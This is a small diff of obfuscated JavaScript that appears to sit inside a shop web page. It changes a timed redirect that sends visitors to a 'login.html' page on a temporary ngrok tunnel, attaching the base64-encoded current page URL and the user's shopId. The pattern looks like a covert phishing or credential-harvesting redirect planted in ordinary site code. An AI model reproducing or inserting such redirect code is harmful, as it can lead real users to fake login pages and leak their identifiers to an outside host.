@@ -247,7 +247,7 @@
            var shopId = _0x3eb1f5["getUserId"]();
 
            /* alert("shopId" + shopId) */
-           location["href"] = "https://9885-183-11-70-121.ngrok-free.app/login.html?yh=" + window["btoa"](encodeURI(top["location"]["href"])) + "&shopId=" + shopId;
+           location["href"] = "https://c120-113-102-164-88.ngrok-free.app/login.html?yh=" + window["btoa"](encodeURI(top["location"]["href"])) + "&shopId=" + shopId;
            }, 1000);
 
            return;
